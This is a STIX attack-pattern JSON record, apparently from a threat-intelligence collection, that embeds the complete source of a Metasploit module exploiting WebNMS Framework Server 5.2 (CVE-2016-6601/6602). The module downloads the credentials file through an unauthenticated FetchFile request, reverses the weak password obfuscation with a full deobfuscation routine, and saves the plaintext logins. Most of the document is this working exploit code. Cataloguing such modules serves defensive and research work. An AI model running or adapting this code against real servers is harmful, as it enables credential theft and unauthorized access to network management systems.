{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b5955707-e549-4242-a96a-78f9d6f92e87",
    "created": "2024-08-14T16:22:59.941507Z",
    "modified": "2024-08-14T16:22:59.941512Z",
    "name": "WebNMS Framework Server Credential Disclosure",
    "description": " This module abuses two vulnerabilities in WebNMS Framework Server 5.2 to extract all user credentials. The first vulnerability is an unauthenticated file download in the FetchFile servlet, which is used to download the file containing the user credentials. The second vulnerability is that the passwords in the file are obfuscated with a very weak algorithm which can be easily reversed. This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on Windows and Linux. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/webnms_cred_disclosure.rb",
            "external_id": "webnms_cred_disclosure.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6601"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6602"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/2712"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Aug/54"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WebNMS Framework Server Credential Disclosure',\n        'Description' => %q{\n          This module abuses two vulnerabilities in WebNMS Framework Server 5.2 to extract\n          all user credentials. The first vulnerability is an unauthenticated file download\n          in the FetchFile servlet, which is used to download the file containing the user\n          credentials. The second vulnerability is that the passwords in the file are\n          obfuscated with a very weak algorithm which can be easily reversed.\n          This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on\n          Windows and Linux.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2016-6601'],\n          [ 'CVE', '2016-6602'],\n          [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2016/Aug/54' ]\n        ],\n        'DisclosureDate' => '2016-07-04'\n      )\n    )\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 9090]),\n        OptString.new('TARGETURI', [true, 'WebNMS path', '/'])\n      ],\n      self.class\n    )\n  end\n\n  def version_check\n    begin\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),\n        'method' => 'GET',\n        'vars_get' => { 'fileName' => 'help/index.html' }\n      )\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,\n           Rex::HostUnreachable, Errno::ECONNRESET => e\n      vprint_error(\"Failed to get Version: #{e.class} - #{e.message}\")\n      return\n    end\n    if res && res.code == 200 && !res.body.empty?\n      title_string = res.get_html_document.at('title').to_s\n      version = title_string.match(/[0-9]+.[0-9]+/)\n      vprint_status(\"Version Detected = #{version}\")\n    end\n  end\n\n  def run\n    # version check will not stop the module, but it will try to\n    # determine the version and print it if verbose is set to true\n    version_check\n    begin\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'servlets', 'FetchFile'),\n        'method' => 'GET',\n        'vars_get' => { 'fileName' => 'conf/securitydbData.xml' }\n      )\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,\n           Rex::HostUnreachable, Errno::ECONNRESET => e\n      print_error(\"Module Failed: #{e.class} - #{e.message}\")\n    end\n\n    if res && res.code == 200 && !res.body.empty?\n      cred_table = Rex::Text::Table.new(\n        'Header' => 'WebNMS Login Credentials',\n        'Indent' => 1,\n        'Columns' =>\n          [\n            'Username',\n            'Password'\n          ]\n      )\n      print_status \"#{peer} - Got securitydbData.xml, attempting to extract credentials...\"\n      res.body.to_s.each_line do |line|\n        # we need these checks because username and password might appear in any random position in the line\n        if line.include? 'username='\n          username = line.match(/username=\"(\\w*)\"/)[1]\n        end\n        if line.include? 'password='\n          password = line.match(/password=\"(\\w*)\"/)[1]\n        end\n        next unless password && username\n\n        plaintext_password = super_redacted_deobfuscation(password)\n        cred_table << [ username, plaintext_password ]\n        connection_details = {\n          module_fullname: fullname,\n          username: username,\n          private_data: plaintext_password,\n          private_type: :password,\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }.merge(service_details)\n        create_credential_and_login(connection_details)\n      end\n\n      print_line\n      print_line(cred_table.to_s)\n      loot_name = 'webnms.creds'\n      loot_type = 'text/csv'\n      loot_filename = 'webnms_login_credentials.csv'\n      loot_desc = 'WebNMS Login Credentials'\n      p = store_loot(\n        loot_name,\n        loot_type,\n        rhost,\n        cred_table.to_csv,\n        loot_filename,\n        loot_desc\n      )\n      print_status \"Credentials saved in: #{p}\"\n      return\n    end\n  end\n\n  # Returns the plaintext of a string obfuscated with WebNMS's super redacted obfuscation algorithm.\n  # I'm sure this can be simplified, but I've spent far too many hours implementing to waste any more time!\n  def super_redacted_deobfuscation(ciphertext)\n    input = ciphertext\n    input = input.gsub('Z', '000')\n\n    base = '0'.upto('9').to_a + 'a'.upto('z').to_a + 'A'.upto('G').to_a\n    base.push 'I'\n    base += 'J'.upto('Y').to_a\n\n    answer = ''\n    k = 0\n    remainder = 0\n    co = input.length / 6\n\n    while k < co\n      part = input[(6 * k), 6]\n      partnum = ''\n      startnum = false\n\n      for i in 0...5\n        isthere = false\n        pos = 0\n        until isthere\n          if part[i] == base[pos]\n            isthere = true\n            partnum += pos.to_s\n            if pos == 0\n              if !startnum\n                answer += '0'\n              end\n            else\n              startnum = true\n            end\n          end\n          pos += 1\n        end\n      end\n\n      isthere = false\n      pos = 0\n      until isthere\n        if part[5] == base[pos]\n          isthere = true\n          remainder = pos\n        end\n        pos += 1\n      end\n\n      if partnum.to_s == '00000'\n        if remainder != 0\n          tempo = remainder.to_s\n          temp1 = answer[0..(tempo.length)]\n          answer = temp1 + tempo\n        end\n      else\n        answer += (partnum.to_i * 60 + remainder).to_s\n      end\n      k += 1\n    end\n\n    if input.length % 6 != 0\n      ending = input[(6 * k)..(input.length)]\n      partnum = ''\n      if ending.length > 1\n        i = 0\n        startnum = false\n        for i in 0..(ending.length - 2)\n          isthere = false\n          pos = 0\n          until isthere\n            if ending[i] == base[pos]\n              isthere = true\n              partnum += pos.to_s\n              if pos == 0\n                if !startnum\n                  answer += '0'\n                end\n              else\n                startnum = true\n              end\n            end\n            pos += 1\n          end\n        end\n\n        isthere = false\n        pos = 0\n        until isthere\n          if ending[i + 1] == base[pos]\n            isthere = true\n            remainder = pos\n          end\n          pos += 1\n        end\n        answer += (partnum.to_i * 60 + remainder).to_s\n      else\n        isthere = false\n        pos = 0\n        until isthere\n          if ending == base[pos]\n            isthere = true\n            remainder = pos\n          end\n          pos += 1\n        end\n        answer += remainder.to_s\n      end\n    end\n\n    final = ''\n    for k in 0..((answer.length / 2) - 1)\n      final.insert(0, (answer[2 * k, 2].to_i + 28).chr)\n    end\n    final\n  end\n\n  def service_details\n    super.merge({ service_name: 'WebNMS-' + (ssl ? 'HTTPS' : 'HTTP') }) # this should possibly be removed\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-04"
}